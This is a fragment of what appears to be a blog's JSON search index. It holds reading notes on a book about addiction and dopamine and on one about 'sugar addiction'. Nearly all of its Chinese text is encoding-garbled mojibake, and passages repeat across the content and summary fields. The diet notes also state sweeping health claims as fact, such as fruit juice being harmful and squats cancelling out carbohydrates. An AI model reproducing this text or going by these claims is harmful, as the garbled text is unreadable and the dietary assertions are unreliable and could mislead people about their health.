ä¸ªæœˆåï¼Œå¤§è„‘çš„å¿«ä¹è®¾å®šç‚¹å°±ä¼šå‘ç”Ÿå˜åŒ–ã€‚ç°åœ¨æˆ‘ä»¬ç»§ç»­ç©æ¸¸æˆï¼Œä¸æ˜¯ä¸ºäº†è·å¾—å¿«ä¹ï¼Œè€Œæ˜¯ä¸ºäº†å›åˆ°æ­£å¸¸çš„æ„Ÿè§‰ã€‚ä¸€æ—¦åœä¸‹æ¥ï¼Œæˆ‘ä»¬å°±ä¼šä½“éªŒåˆ°æˆ’æ–­ä»»ä½•æˆç˜¾ç‰©è´¨æ—¶ä¼šå‡ºç°çš„æ™®éç—‡çŠ¶ï¼šç„¦è™‘ã€æ˜“æ€’ã€å¤±çœ ã€çƒ¦èºå’Œå¼ºçƒˆçš„æ¸´æ±‚ï¼Œä¸€å¿ƒæƒ³å›åˆ°é‚£ä¸ªæˆç˜¾ç‰©è´¨èº«è¾¹ã€‚\næœ‰çº¿ä¸€å¸¦çš„\u0026quot;çš®ä¸‹æ³¨å°„å™¨\u0026quot; å¹¶éäººäººéƒ½ç©ç”µå­æ¸¸æˆï¼Œä½†å‡ ä¹æ‰€æœ‰äººéƒ½æœ‰ä¸€ä¸ªä»¤è‡ªå·±æˆç˜¾çš„æ•°å­—åŒ–äº§å“ï¼Œå…¶ä¸­å¾ˆå¯èƒ½å°±åŒ…æ‹¬æ™ºèƒ½æ‰‹æœºâ€”â€”å®ƒç›¸å½“äº â€œæœ‰çº¿ä¸€ä»£â€(wired generation)çš„â€œçš®ä¸‹æ³¨å°„é’ˆâ€ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œè¦å‡å°‘æ‰‹æœºçš„ä½¿ç”¨æ˜¯éå¸¸å›°éš¾çš„ï¼Œä¸€æ—¦ç¦»å¼€æ‰‹æœºï¼Œå¤§è„‘çš„å¿«ä¹-ç—›è‹¦å¤©å¹³å°±ä¼šå‘ç—›è‹¦çš„ä¸€ä¾§å€¾æ–œï¼Œä»¤äººæ„Ÿåˆ°ä¸å®‰å’Œæš´èºã€‚ä½†è¿™ä¹ˆåšæ˜¯å€¼å¾—çš„ï¼Œå› ä¸ºè‹¥èƒ½ä¿æŒè¶³å¤Ÿé•¿çš„æ—¶é—´ä¸å»ä½¿ç”¨æ‰‹æœºï¼Œæ›´åŠ å¥åº·ã€å¹³è¡¡çš„å¤šå·´èƒºæ°´å¹³ä¼šå¸¦æ¥è¯¸å¤šç›Šå¤„ã€‚å¤§è„‘ä¸å†è¢«æ¸´æ±‚å æ®ï¼Œæˆ‘ä»¬æ‰èƒ½æ›´åŠ ä¸“æ³¨äºå½“ä¸‹ï¼Œå†æ¬¡ä»ç”Ÿæ´»ä¸­é‚£äº›å¾®å°çš„ã€æ„æƒ³ä¸åˆ°çš„å¥–åŠ±ä¸­è·å¾—å¿«ä¹\nå‚è€ƒ å¤šå·´èƒº ","permalink":"https://wdd.js.org/books/005-%E6%88%90%E7%98%BE-%E5%9C%A8%E6%94%BE%E7%BA%B5%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%B9%B3%E8%A1%A1/","summary":"å¿«ä¹çš„ä½ç½® è¯»å®Œè¿™æœ¬ä¹¦ï¼Œæˆ‘æœ€å¤§çš„æ”¶è·æ˜¯è¿™å¥è¯ï¼š\nåœ¨è¿‡å»ä¸ƒåäº”å¹´é‡Œï¼Œç¥ç»ç§‘å­¦é¢†åŸŸæœ€é‡è¦çš„å‘ç°ä¹‹ä¸€ï¼Œå°±æ˜¯å¤§è„‘ä¸­å¤„ç†å¿«ä¹å’Œç—›è‹¦çš„åŒºåŸŸæ˜¯ç›¸åŒçš„\nä¹‹å‰æˆ‘ä¸€ç›´æœ‰ä¸ªè¯¯è§£ï¼Œæˆ‘è®¤ä¸ºäººçš„å¤§è„‘æ„Ÿå—å¿«ä¹å’Œç—›è‹¦çš„åŒºåŸŸæ˜¯åˆ†å¼€çš„ã€‚\nå¦‚æœå¿«ä¹å’Œç—›è‹¦éƒ½æ˜¯åœ¨ä¸€ä¸ªä½ç½®æ„Ÿå—ï¼Œé‚£ç—›è‹¦è¿˜æ˜¯å¿«ä¹ï¼Œç”±ä»€ä¹ˆå†³å®šå‘¢ï¼Ÿ\nç˜¾å½¢æˆçš„æœºåˆ¶ï¼š å†…ç¨³æ€çš„å¤©å¹³ æ¯ä¸ªäººæˆ–å¤šæˆ–å°‘éƒ½æœ‰æŸç§ç˜¾ï¼Œ å°±æ¯”å¦‚æˆ‘ï¼Œ æœ‰æ®µæ—¶é—´æœ‰ç©ç”µå­æ¸¸æˆçš„ç˜¾ã€‚ ç©çš„æ—¶å€™å¾ˆå¼€å¿ƒï¼Œ å‡ æŠŠæ¸¸æˆç»“æŸä¹‹åï¼Œæœ‰æ„Ÿè§‰éå¸¸å¤±è½ã€‚æ²¡è¿‡å‡ å°æ—¶ï¼Œåˆæƒ³å†å¼€ä¸€å±€ã€‚ è¿™ç§æƒ…ç»ªå½¢æˆçš„åŸå› æ˜¯ä»€ä¹ˆï¼Œæ˜¯æˆ‘æƒ³è¦äº†è§£çš„ã€‚\næˆç˜¾ï¼ˆè‹±è¯­ï¼šaddictionï¼‰æ˜¯æŒ‡ä¸€ç§é‡å¤æ€§çš„å¼ºè¿«è¡Œä¸ºï¼Œå³ä½¿è¿™äº›è¡Œä¸ºå·²çŸ¥å¯èƒ½é€ æˆä¸è‰¯åæœçš„æƒ…å½¢ä¸‹ï¼Œä»ç„¶è¢«æŒç»­é‡å¤[5]ã€‚è¿™ç§è¡Œä¸ºå¯èƒ½å› ä¸­æ¢ç¥ç»ç³»ç»ŸåŠŸèƒ½å¤±è°ƒé€ æˆï¼Œé‡å¤è¿™äº›è¡Œä¸ºä¹Ÿå¯ä»¥åè¿‡æ¥é€ æˆç¥ç»åŠŸèƒ½å—æŸ \u0026ndash;ç»´åŸºç™¾ç§‘\nå¤§è„‘ä¼šåŠªåŠ›ç»´æŒå¿«ä¹å’Œç—›è‹¦çš„å¹³è¡¡ã€‚æ¯å½“è¿™ä¸ªå¤©å¹³å‘ä¸€ä¾§å€¾æ–œæ—¶ï¼Œå¤§è„‘å°±ä¼šåœ¨å¦å¤–ä¸€ä¾§æ–½åŠ å‹åŠ›ï¼Œç«­åŠ›æ¢å¤å¹³è¡¡ï¼Œç¥ç»ç§‘å­¦å®¶ç§°ä¹‹ä¸ºå†…ç¨³æ€\nå¤šå·´èƒºè¢«é‡Šæ”¾ä»¥åï¼Œå¤§è„‘ä¼šç›¸åº”åœ°å‡å°‘æˆ–â€œä¸‹è°ƒâ€è¢«åˆºæ¿€çš„å¤šå·´èƒºå—ä½“çš„æ•°é‡ï¼Œä»è€Œå¯¼è‡´å¿«ä¹-ç—›è‹¦çš„å¤©å¹³å‘ç—›è‹¦ç«¯å€¾æ–œï¼Œä»¥æ¢å¤å¹³è¡¡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šåœ¨å¿«ä¹è¿‡åäº§ç”Ÿå®¿é†‰æ„Ÿæˆ–å¤±è½æ„Ÿã€‚å€˜è‹¥ç­‰å¾…è¶³å¤Ÿé•¿çš„æ—¶é—´ï¼Œè¿™ç§æ„Ÿè§‰å°±ä¼šæ¶ˆå¤±ï¼Œæˆ‘ä»¬ä¼šé‡æ–°å›å½’ä¸­ç«‹çš„çŠ¶æ€ã€‚ç„¶è€Œï¼Œäººç±»å¤©ç”Ÿæ¸´æœ›å¯¹æŠ—è¿™ç§æ„Ÿè§‰ï¼Œäºæ˜¯æˆ‘ä»¬ä¼šå†æ¬¡å›åˆ°é‚£ä¸ªå¿«ä¹æºæ³‰çš„æ€€æŠ±â€”â€”æ¯”å¦‚å†ç©ä¸€å±€æ¸¸æˆ\nå¦‚æœæ¯å¤©ä¿æŒè¿™ç§æ¨¡å¼å‡ ä¸ªå°æ—¶ï¼Œå‡ å‘¨æˆ–å‡ ä¸ªæœˆåï¼Œå¤§è„‘çš„å¿«ä¹è®¾å®šç‚¹å°±ä¼šå‘ç”Ÿå˜åŒ–ã€‚ç°åœ¨æˆ‘ä»¬ç»§ç»­ç©æ¸¸æˆï¼Œä¸æ˜¯ä¸ºäº†è·å¾—å¿«ä¹ï¼Œè€Œæ˜¯ä¸ºäº†å›åˆ°æ­£å¸¸çš„æ„Ÿè§‰ã€‚ä¸€æ—¦åœä¸‹æ¥ï¼Œæˆ‘ä»¬å°±ä¼šä½“éªŒåˆ°æˆ’æ–­ä»»ä½•æˆç˜¾ç‰©è´¨æ—¶ä¼šå‡ºç°çš„æ™®éç—‡çŠ¶ï¼šç„¦è™‘ã€æ˜“æ€’ã€å¤±çœ ã€çƒ¦èºå’Œå¼ºçƒˆçš„æ¸´æ±‚ï¼Œä¸€å¿ƒæƒ³å›åˆ°é‚£ä¸ªæˆç˜¾ç‰©è´¨èº«è¾¹ã€‚\næœ‰çº¿ä¸€å¸¦çš„\u0026quot;çš®ä¸‹æ³¨å°„å™¨\u0026quot; å¹¶éäººäººéƒ½ç©ç”µå­æ¸¸æˆï¼Œä½†å‡ ä¹æ‰€æœ‰äººéƒ½æœ‰ä¸€ä¸ªä»¤è‡ªå·±æˆç˜¾çš„æ•°å­—åŒ–äº§å“ï¼Œå…¶ä¸­å¾ˆå¯èƒ½å°±åŒ…æ‹¬æ™ºèƒ½æ‰‹æœºâ€”â€”å®ƒç›¸å½“äº â€œæœ‰çº¿ä¸€ä»£â€(wired generation)çš„â€œçš®ä¸‹æ³¨å°„é’ˆâ€ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œè¦å‡å°‘æ‰‹æœºçš„ä½¿ç”¨æ˜¯éå¸¸å›°éš¾çš„ï¼Œä¸€æ—¦ç¦»å¼€æ‰‹æœºï¼Œå¤§è„‘çš„å¿«ä¹-ç—›è‹¦å¤©å¹³å°±ä¼šå‘ç—›è‹¦çš„ä¸€ä¾§å€¾æ–œï¼Œä»¤äººæ„Ÿåˆ°ä¸å®‰å’Œæš´èºã€‚ä½†è¿™ä¹ˆåšæ˜¯å€¼å¾—çš„ï¼Œå› ä¸ºè‹¥èƒ½ä¿æŒè¶³å¤Ÿé•¿çš„æ—¶é—´ä¸å»ä½¿ç”¨æ‰‹æœºï¼Œæ›´åŠ å¥åº·ã€å¹³è¡¡çš„å¤šå·´èƒºæ°´å¹³ä¼šå¸¦æ¥è¯¸å¤šç›Šå¤„ã€‚å¤§è„‘ä¸å†è¢«æ¸´æ±‚å æ®ï¼Œæˆ‘ä»¬æ‰èƒ½æ›´åŠ ä¸“æ³¨äºå½“ä¸‹ï¼Œå†æ¬¡ä»ç”Ÿæ´»ä¸­é‚£äº›å¾®å°çš„ã€æ„æƒ³ä¸åˆ°çš„å¥–åŠ±ä¸­è·å¾—å¿«ä¹\nå‚è€ƒ å¤šå·´èƒº ","title":"æˆç˜¾ï¼šåœ¨æ”¾çºµä¸­å¯»æ‰¾å¹³è¡¡"},{"content":" äººç±»è¯ç”Ÿåœ¨200ä¸‡å¹´å‰ï¼Œå·¥ä¸šé©å‘½è¯ç”Ÿåˆ°ç°åœ¨ä¸åˆ°200å¹´ã€‚\n200ç›¸æ¯”äº200ä¸‡ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚\næˆ‘ä»¬çš„èº«ä½“ï¼Œç»†èƒï¼Œæ˜¯ä¸¤ç™¾ä¸‡å¹´çš„ç»å†ç´¯ç§¯çš„ç»“æ™¶ã€‚åœ¨200ä¸‡å¹´çš„æ—¶é—´ï¼Œæˆ‘ä»¬ä»é‡‡é›†ã€ç‹©çŒè·å–é£Ÿç‰©ï¼Œå¤§éƒ¨åˆ†æ—¶é—´å¤„äºé¥¥é¥¿çŠ¶æ€ï¼Œæ”¹å˜ä¸ºä»è¶…å¸‚ã€èœå¸‚åœºã€ç¾é£Ÿå¹¿åœºã€åœ¨çº¿å•†åŸä¸­é€‰è´­ã€‚\nå°±å¥½åƒæ—©ä¸Šåˆšå‡ºç”Ÿå°ç‰›ï¼Œä¸­åˆå°±å¼€å§‹åƒçº¢é…’é…æ³•å¼é¹…è‚ã€‚\nèº«ä½“å˜åŒ–ä¸å¤§ï¼Œæˆ‘ä»¬çš„é¥®é£Ÿç»“æ„å¯ä»¥è¯´åœ¨æçŸ­çš„æ—¶é—´å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ã€‚\nå› æ­¤ï¼Œä¹Ÿéš¾æ€ªä¸‰é«˜ã€å„ç§æ…¢æ€§ç—…ï¼Œå…¨ä¸–ç•Œéåœ°å¼€èŠ±ã€æ˜Ÿç«ç‡åŸã€‚\nã€Šç³–ä¸­æ¯’ã€‹ ç‰§ç”°å–„äºŒ\n13ä¸ªç¬”è®°\näº†è§£ç³–åˆ†æ˜¯ä»€ä¹ˆï¼Œå°±èƒ½è½»æ¾å‡è‚¥ å¤§è„‘å¤„äºä¸ç”±è‡ªä¸»åœ°æƒ³æ‘„å…¥ç±³é¥­å’Œé¢ç±»é£Ÿç‰©ç­‰ç¢³æ°´åŒ–åˆç‰©ã€æ— é†‡é¥®æ–™ï¿¼ã€é›¶é£Ÿ åœ¨ç°ä»£ç¤¾ä¼šï¼Œä¸ä¸Šç˜¾æ˜¯å¾ˆéš¾çš„ ä¸¤è€…çš„æ ¹æºéƒ½æ˜¯â€œå¤§è„‘æ— æ³•å¿˜è®°å¿«æ„Ÿâ€ã€‚ â€œä¸ºäº†å¤§è„‘è¿è½¬è€Œæ‘„å–ç³–åˆ†â€æ˜¯æ¶é­”çš„è°è¨€ å¤§è„‘çš„èƒ½é‡æ¥æºé€šå¸¸æ˜¯è‘¡è„ç³–ã€‚å¦‚æœè‘¡è„ç³–ä¸è¶³ï¼Œåˆ™é€šè¿‡è›‹ç™½è´¨å’Œè„‚è‚ªåˆ†è§£å‡ºæ¥çš„æ°¨åŸºé…¸å’Œç”˜æ²¹ä¸‰é…¯æ¥ç»´æŒè¡€ç³–å€¼ã€‚ä½†æ˜¯å¦‚æœç»§ç»­ç¦é£Ÿï¼Œè¡€æ¶²ä¸­çš„é…®ä½“å°±ä¼šä¸Šå‡ï¼Œå¤§è„‘å°±ä¼šç”¨é…®ä½“ä»£æ›¿è‘¡è„ç³–ä½œä¸ºèƒ½é‡æº ç¬¬ä¸€ç« å›é¡¾ â—é¡»çŸ¥è‚¥èƒ–å’Œç³–ä¸­æ¯’éƒ½æ˜¯æ…¢æ€§ç—…ã€‚ â—è®©æˆ‘ä»¬å‘èƒ–çš„ä¸æ˜¯çƒ­é‡è€Œæ˜¯ç³–åˆ†ã€‚ â—è‚¥èƒ–çš„åŸå› æ˜¯ç³–ä¸­æ¯’ï¼Œä¸æ„å¿—å’Œä½“è´¨æ— å…³ã€‚ â—äº†è§£ç³–åˆ†æ˜¯ä»€ä¹ˆå¹¶é€‚å½“æ‘„å–ï¼Œå°±èƒ½è½»æ¾å‡è‚¥ã€‚ â—è”¬èœæ±å’Œæœæ±å¯¹èº«ä½“æœ‰å®³ã€‚ â—ç¢³æ°´åŒ–åˆç‰©æ‰æ˜¯å¼•èµ·ç³–ä¸­æ¯’çš„ä¸»è¦åŸå› ã€‚ â—è®°ä½äº†è‡³ç¦ç‚¹çš„å¤§è„‘ï¼Œå°±åƒè¢«ç³–æ§åˆ¶äº†ä¸€æ ·ã€‚ â—å¦‚æœæ²¡æœ‰æ„è¯†åˆ°è¿™ä¸€ç‚¹ï¼Œå¤§å¤šæ•°äººéƒ½ä¼šé™·å…¥ç³–ä¸­æ¯’ã€‚ â—å³ä½¿è‘¡è„ç³–ä¸è¶³ï¼Œå¤§è„‘ä¹Ÿä¸ä¼šåœæ­¢è¿è½¬ â€œå¥–åŠ±ç³»ç»Ÿâ€â€”â€”å¼•èµ·ç³–ä¸­æ¯’çš„æœºåˆ¶ æ‰€è°“çš„ç³–ä¸­æ¯’ï¼Œå°±æ˜¯ç”±äºå¤§è„‘å¯¹ç³–åˆ†çš„ååº”æœºåˆ¶ï¼Œäººä»¬æ— æ³•ä»è¿™ç§å¾ªç¯ä¸­æ‘†è„±å‡ºæ¥çš„ä¸€ç§çŠ¶æ€ã€‚ æ¶²æ€ç³–æ˜¯ä¸€ç§é­”é¬¼é£Ÿå“ è¡€ç³–å€¼ä¸€æ—¦è·Œç ´70 mg/dLï¼Œå°±ä¼šå‡ºç°ä¸é€‚ç—‡çŠ¶ï¼Œå°±ä¼šè¢«è¿«æŒ‰ç…§å¤§è„‘çš„æŒ‡ä»¤æ‘„å–ç³–åˆ† ç³–åˆ†ä½¿ä½ å‘èƒ–â€”â€”è‚¥èƒ–çš„æœºåˆ¶ èƒ°å²›ç´ å…ˆå°†è¡€æ¶²ä¸­æº¢å‡ºçš„è‘¡è„ç³–è½¬åŒ–ä¸ºç³–åŸï¼Œå‚¨å­˜åœ¨è‚è„å’Œè‚Œè‚‰ä¸­ ç¬¬äºŒç« å›é¡¾ ç³–åˆ†æ‘„å…¥çš„è¶Šå¤šï¼Œå¤§è„‘å°±è¶Šå®¹æ˜“ä¸Šç˜¾ã€‚ â—çƒ¦èºæ˜“æ€’ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºç³–ä¸­æ¯’ã€‚ â—å«æœ‰å¤§é‡ç³–åˆ†çš„ç¢³é…¸é¥®æ–™å’Œæœæ±ç®€ç›´å°±æ˜¯é­”é¬¼é£Ÿå“ã€‚ â—ç³–ä¸­æ¯’ä¼šåŠ é€Ÿè¡°è€ã€‚ â—ç³–ä¸­æ¯’ä¼šå¯¼è‡´ç³–å°¿ç—…ã€é«˜è¡€å‹ã€ç™Œç—‡ã€å¿ƒè‚Œæ¢—æ­»ã€è„‘å’ä¸­ã€æ…¢æ€§è‚¾ç—…å’Œé˜¿å°”èŒ¨æµ·é»˜ç—…ã€‚ â—ç³–åˆ†å‡ ä¹ç™¾åˆ†ä¹‹ç™¾ä¼šè½¬åŒ–ä¸ºè‘¡è„ç³–ï¼Œè¢«äººä½“å…¨éƒ¨å¸æ”¶ã€‚ â—åƒè„‚è´¨å¹¶ä¸ä¼šå˜èƒ–ã€‚ â—å‡å°‘è„‚è´¨æ‘„å…¥é‡ä¸èƒ½å‡è‚¥ï¼Œåè€Œä¼šå±å®³å¥åº·ã€‚ â—åªè¦ä¸åœåœ°åƒç¢³æ°´åŒ–åˆç‰©ï¼Œå°±æ°¸è¿œä¹Ÿç˜¦ä¸ä¸‹æ¥ã€‚ â—ç”·æ€§è‚¥èƒ–ç‰¹åˆ«å±é™©ï¼Œå¥³æ€§å¤ªç˜¦ä¹Ÿä¸å¥½ã€‚ å“ªäº›é£Ÿç‰©ä¸ä¼šå¯¼è‡´è¡€ç³–å€¼å‡é«˜ è”¬èœï¼ˆä¸åŒ…æ‹¬æ ¹èŒç±»è”¬èœï¼‰ã€è˜‘è‡ã€æµ·è—»ã€è±†ç±»ã€è‚‰ç±»ã€é±¼ç±»ã€è±†è…åŸºæœ¬ä¸Šä¸ä¼šå¯¼è‡´è¡€ç³–å€¼å‡é«˜ ç±³é¥­ã€é¢åŒ…ç­‰ç¢³æ°´åŒ–åˆç‰©ï¼Œè–¯ç±»ç­‰å«ç³–é‡é«˜çš„æ ¹èŒç±»è”¬èœï¼Œå—ç“œç­‰å«ç³–é‡é«˜çš„è”¬èœï¼Œå«ç³–é‡é«˜çš„æ— é†‡é¥®æ–™ç­‰ï¼Œä¼šå¯¼è‡´è¡€ç³–å€¼å¤§å¹…å‡é«˜ æœ€åå†åƒç¢³æ°´åŒ–åˆç‰© åªè¦å¥½å¥½å’€åš¼ï¼Œå°±èƒ½å‘å¤§è„‘çš„é¥±è…¹ä¸­æ¢å‘å‡ºâ€œåƒäº†å¾ˆå¤šâ€çš„ä¿¡å·ï¼Œæœ€ç»ˆå°±èƒ½å‡å°‘ç¢³æ°´åŒ–åˆç‰©çš„æ‘„å…¥é‡ã€‚ â€œåƒå®Œåé©¬ä¸Šè¿åŠ¨â€â€”â€”æŠµæ¶ˆåˆšåˆšåƒè¿›å»çš„ç¢³æ°´åŒ–åˆç‰© 12ç§’æ·±è¹²â€ï¼Œç‰¹åˆ«é€‚åˆé‚£äº›æ²¡æœ‰æ—¶é—´è¿åŠ¨çš„äººã€‚é¡¾åæ€ä¹‰ï¼Œæ¯æ¬¡æ·±è¹²åªéœ€12ç§’ã€‚æ…¢æ…¢è¹²ä¸‹æ¥ï¼Œæ…¢æ…¢ç«™èµ·æ¥ï¼Œè¿™ä¸ªåŠ¨ä½œå¯¹å¤§è…¿çš„è´Ÿè·å¾ˆå¤§ï¼Œæ•ˆæœå¾ˆå¥½ã€‚ è¿™æ ·åš10æ¬¡ï¼Œå°±èƒ½æŠµæ¶ˆåˆšåˆšåƒè¿›å»çš„ç¢³æ°´åŒ–åˆç‰©ã€‚ ç¬¬ä¸‰ç« å›é¡¾ ä¸€è¾ˆå­éƒ½ä¸å–å«ç³–çš„ç¢³é…¸é¥®æ–™ã€å«ç³–çš„ç½è£…å’–å•¡ç­‰é¥®æ–™ æ¥è‡ªå¾®ä¿¡è¯»ä¹¦\n","permalink":"https://wdd.js.org/books/004-%E7%B3%96%E4%B8%AD%E6%AF%92/","summary":"äººç±»è¯ç”Ÿåœ¨200ä¸‡å¹´å‰ï¼Œå·¥ä¸šé©å‘½è¯ç”Ÿåˆ°ç°åœ¨ä¸åˆ°200å¹´ã€‚\n200ç›¸æ¯”äº200ä¸‡ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚\næˆ‘ä»¬çš„èº«ä½“ï¼Œç»†èƒï¼Œæ˜¯ä¸¤ç™¾ä¸‡å¹´çš„ç»å†ç´¯ç§¯çš„ç»“æ™¶ã€‚åœ¨200ä¸‡å¹´çš„æ—¶é—´ï¼Œæˆ‘ä»¬ä»é‡‡é›†ã€ç‹©çŒè·å–é£Ÿç‰©ï¼Œå¤§éƒ¨åˆ†æ—¶é—´å¤„äºé¥¥é¥¿çŠ¶æ€ï¼Œæ”¹å˜ä¸ºä»è¶…å¸‚ã€èœå¸‚åœºã€ç¾é£Ÿå¹¿åœºã€åœ¨çº¿å•†åŸä¸­é€‰è´­ã€‚\nå°±å¥½åƒæ—©ä¸Šåˆšå‡ºç”Ÿå°ç‰›ï¼Œä¸­åˆå°±å¼€å§‹åƒçº¢é…’é…æ³•å¼é¹…è‚ã€‚\nèº«ä½“å˜åŒ–ä¸å¤§ï¼Œæˆ‘ä»¬çš„é¥®é£Ÿç»“æ„å¯ä»¥è¯´åœ¨æçŸ­çš„æ—¶é—´å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ã€‚\nå› æ­¤ï¼Œä¹Ÿéš¾æ€ªä¸‰é«˜ã€å„ç§æ…¢æ€§ç—…ï¼Œå…¨ä¸–ç•Œéåœ°å¼€èŠ±ã€æ˜Ÿç«ç‡åŸã€‚\nã€Šç³–ä¸­æ¯’ã€‹ ç‰§ç”°å–„äºŒ\n13ä¸ªç¬”è®°\näº†è§£ç³–åˆ†æ˜¯ä»€ä¹ˆï¼Œå°±èƒ½è½»æ¾å‡è‚¥ å¤§è„‘å¤„äºä¸ç”±è‡ªä¸»åœ°æƒ³æ‘„å…¥ç±³é¥­å’Œé¢ç±»é£Ÿç‰©ç­‰ç¢³æ°´åŒ–åˆç‰©ã€æ— é†‡é¥®æ–™ï¿¼ã€é›¶é£Ÿ åœ¨ç°ä»£ç¤¾ä¼šï¼Œä¸ä¸Šç˜¾æ˜¯å¾ˆéš¾çš„ ä¸¤è€…çš„æ ¹æºéƒ½æ˜¯â€œå¤§è„‘æ— æ³•å¿˜è®°å¿«æ„Ÿâ€ã€‚ â€œä¸ºäº†å¤§è„‘è¿è½¬è€Œæ‘„å–ç³–åˆ†â€æ˜¯æ¶é­”çš„è°è¨€ å¤§è„‘çš„èƒ½é‡æ¥æºé€šå¸¸æ˜¯è‘¡è„ç³–ã€‚å¦‚æœè‘¡è„ç³–ä¸è¶³ï¼Œåˆ™é€šè¿‡è›‹ç™½è´¨å’Œè„‚è‚ªåˆ†è§£å‡ºæ¥çš„æ°¨åŸºé…¸å’Œç”˜æ²¹ä¸‰é…¯æ¥ç»´æŒè¡€ç³–å€¼ã€‚ä½†æ˜¯å¦‚æœç»§ç»­ç¦é£Ÿï¼Œè¡€æ¶²ä¸­çš„é…®ä½“å°±ä¼šä¸Šå‡ï¼Œå¤§è„‘å°±ä¼šç”¨é…®ä½“ä»£æ›¿è‘¡è„ç³–ä½œä¸ºèƒ½é‡æº ç¬¬ä¸€ç« å›é¡¾ â—é¡»çŸ¥è‚¥èƒ–å’Œç³–ä¸­æ¯’éƒ½æ˜¯æ…¢æ€§ç—…ã€‚ â—è®©æˆ‘ä»¬å‘èƒ–çš„ä¸æ˜¯çƒ­é‡è€Œæ˜¯ç³–åˆ†ã€‚ â—è‚¥èƒ–çš„åŸå› æ˜¯ç³–ä¸­æ¯’ï¼Œä¸æ„å¿—å’Œä½“è´¨æ— å…³ã€‚ â—äº†è§£ç³–åˆ†æ˜¯ä»€ä¹ˆå¹¶é€‚å½“æ‘„å–ï¼Œå°±èƒ½è½»æ¾å‡è‚¥ã€‚ â—è”¬èœæ±å’Œæœæ±å¯¹èº«ä½“æœ‰å®³ã€‚ â—ç¢³æ°´åŒ–åˆç‰©æ‰æ˜¯å¼•èµ·ç³–ä¸­æ¯’çš„ä¸»è¦åŸå› ã€‚ â—è®°ä½äº†è‡³ç¦ç‚¹çš„å¤§è„‘ï¼Œå°±åƒè¢«ç³–æ§åˆ¶äº†ä¸€æ ·ã€‚ â—å¦‚æœæ²¡æœ‰æ„è¯†åˆ°è¿™ä¸€ç‚¹ï¼Œå¤§å¤šæ•°äººéƒ½ä¼šé™·å…¥ç³–ä¸­æ¯’ã€‚ â—å³ä½¿è‘¡è„ç³–ä¸è¶³ï¼Œå¤§è„‘ä¹Ÿä¸ä¼šåœæ­¢è¿è½¬ â€œå¥–åŠ±ç³»ç»Ÿâ€â€”â€”å¼•èµ·ç³–ä¸­æ¯’çš„æœºåˆ¶ æ‰€è°“çš„ç³–ä¸­æ¯’ï¼Œå°±æ˜¯ç”±äºå¤§è„‘å¯¹ç³–åˆ†çš„ååº”æœºåˆ¶ï¼Œäººä»¬æ— æ³•ä»è¿™ç§å¾ªç¯ä¸­æ‘†è„±å‡ºæ¥çš„ä¸€ç§çŠ¶æ€ã€‚ æ¶²æ€ç³–æ˜¯ä¸€ç§é­”é¬¼é£Ÿå“ è¡€ç³–å€¼ä¸€æ—¦è·Œç ´70 mg/dLï¼Œå°±ä¼šå‡ºç°ä¸é€‚ç—‡çŠ¶ï¼Œå°±ä¼šè¢«è¿«æŒ‰ç…§å¤§è„‘çš„æŒ‡ä»¤æ‘„å–ç³–åˆ† ç³–åˆ†ä½¿ä½ å‘èƒ–â€”â€”è‚¥èƒ–çš„æœºåˆ¶ èƒ°å²›ç´ å…ˆå°†è¡€æ¶²ä¸­æº¢å‡ºçš„è‘¡è„ç³–è½¬åŒ–ä¸ºç³–åŸï¼Œå‚¨å­˜åœ¨è‚è„å’Œè‚Œè‚‰ä¸­ ç¬¬äºŒç« å›é¡¾ ç³–åˆ†æ‘„å…¥çš„è¶Šå¤šï¼Œå¤§è„‘å°±è¶Šå®¹æ˜“ä¸Šç˜¾ã€‚ â—çƒ¦èºæ˜“æ€’ä¹Ÿå¯èƒ½æ˜¯å› ä¸ºç³–ä¸­æ¯’ã€‚ â—å«æœ‰å¤§é‡ç³–åˆ†çš„ç¢³é…¸é¥®æ–™å’Œæœæ±ç®€ç›´å°±æ˜¯é­”é¬¼é£Ÿå“ã€‚ â—ç³–ä¸­æ¯’ä¼šåŠ é€Ÿè¡°è€ã€‚ â—ç³–ä¸­æ¯’ä¼šå¯¼è‡´ç³–å°¿ç—…ã€é«˜è¡€å‹ã€ç™Œç—‡ã€å¿ƒè‚Œæ¢—æ­»ã€è„‘å’ä¸­ã€æ…¢æ€§è‚¾ç—…å’Œé˜¿å°”èŒ¨æµ·é»˜ç—…ã€‚ â—ç³–åˆ†å‡ ä¹ç™¾åˆ†ä¹‹ç™¾ä¼šè½¬åŒ–ä¸ºè‘¡è„ç³–ï¼Œè¢«äººä½“å…¨éƒ¨å¸æ”¶ã€‚ â—åƒè„‚è´¨å¹¶ä¸ä¼šå˜èƒ–ã€‚ â—å‡å°‘è„‚è´¨æ‘„å…¥é‡ä¸èƒ½å‡è‚¥ï¼Œåè€Œä¼šå±å®³å¥åº·ã€‚ â—åªè¦ä¸åœåœ°åƒç¢³æ°´åŒ–åˆç‰©ï¼Œå°±æ°¸è¿œä¹Ÿç˜¦ä¸ä¸‹æ¥ã€‚ â—ç”·æ€§è‚¥èƒ–ç‰¹åˆ«å±é™©ï¼Œå¥³æ€§å¤ªç˜¦ä¹Ÿä¸å¥½ã€‚ å“ªäº›é£Ÿç‰©ä¸ä¼šå¯¼è‡´è¡€ç³–å€¼å‡é«˜ è”¬èœï¼ˆä¸åŒ…æ‹¬æ ¹èŒç±»è”¬èœï¼‰ã€è˜‘è‡ã€æµ·è—»ã€è±†ç±»ã€è‚‰ç±»ã€é±¼ç±»ã€è±†è…åŸºæœ¬ä¸Šä¸ä¼šå¯¼è‡´è¡€ç³–å€¼å‡é«˜ ç±³é¥­ã€é¢åŒ…ç­‰ç¢³æ°´åŒ–åˆç‰©ï¼Œè–¯ç±»ç­‰å«ç³–é‡é«˜çš„æ ¹èŒç±»è”¬èœï¼Œå—ç“œç­‰å«ç³–é‡é«˜çš„è”¬èœï¼Œå«ç³–é‡é«˜çš„æ— é†‡é¥®æ–™ç­‰ï¼Œä¼šå¯¼è‡´è¡€ç³–å€¼å¤§å¹…å‡é«˜ 